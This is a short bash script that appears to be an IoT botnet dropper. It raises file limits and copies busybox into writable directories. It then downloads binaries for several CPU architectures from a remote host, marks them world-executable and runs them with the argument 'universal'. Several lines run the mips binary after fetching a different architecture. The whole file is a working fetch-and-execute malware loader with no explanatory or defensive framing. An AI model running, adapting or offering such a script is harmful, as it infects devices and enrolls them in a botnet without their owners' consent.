#!/bin/bash
ulimit -n 65535 2>/dev/null || true
cp /bin/busybox /tmp/ || cp /bin/busybox /var/tmp/ || cp /bin/busybox /var/run/ || cp /bin/busybox /run/ || cp /bin/busybox /dev/shm/ || cp /bin/busybox /mnt/ || cp /bin/busybox /root/ || cp /bin/busybox /opt/ || cp /bin/busybox /var/ || cp /bin/busybox /home/ || true
cd /tmp || cd /var/tmp || cd /var/run || cd /run || cd /dev/shm || cd /mnt || cd /root || cd /opt || cd /var || cd /home || cd /; wget http://store.risesmp.cc/wow/ntb.mips; chmod 777 ntb.mips; ./ntb.mips universal
cd /tmp || cd /var/tmp || cd /var/run || cd /run || cd /dev/shm || cd /mnt || cd /root || cd /opt || cd /var || cd /home || cd /; wget http://store.risesmp.cc/wow/ntb.mipsel; chmod 777 ntb.mipsel; ./ntb.mipsel universal
cd /tmp || cd /var/tmp || cd /var/run || cd /run || cd /dev/shm || cd /mnt || cd /root || cd /opt || cd /var || cd /home || cd /; wget http://store.risesmp.cc/wow/ntb.arm64; chmod 777 ntb.arm64; ./ntb.mips universal
cd /tmp || cd /var/tmp || cd /var/run || cd /run || cd /dev/shm || cd /mnt || cd /root || cd /opt || cd /var || cd /home || cd /; wget http://store.risesmp.cc/wow/ntb.arm6; chmod 777 ntb.arm6; ./ntb.mips universal
cd /tmp || cd /var/tmp || cd /var/run || cd /run || cd /dev/shm || cd /mnt || cd /root || cd /opt || cd /var || cd /home || cd /; wget http://store.risesmp.cc/wow/ntb.arm7; chmod 777 ntb.arm7; ./ntb.mips universal
